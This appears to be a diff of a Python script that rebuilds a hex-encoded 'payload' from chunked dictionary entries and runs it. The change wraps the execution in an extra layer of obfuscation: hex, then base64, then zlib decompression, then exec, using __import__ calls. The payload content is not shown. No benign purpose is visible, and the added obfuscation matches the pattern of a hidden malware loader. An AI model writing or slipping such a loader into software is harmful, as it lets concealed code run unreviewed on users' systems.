@@ -38,4 +38,7 @@ for number, value in payloads_dict.items():
     payloads[number] = value
 
 payload = ''.join(payloads)
-exec(base64.b64decode(bytes.fromhex(payload)))
+payload_from_hex = (bytes.fromhex(payload))
+payload_from_hex_decoded = payload_from_hex.decode("utf-8")
+
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload_from_hex_decoded)[0])))
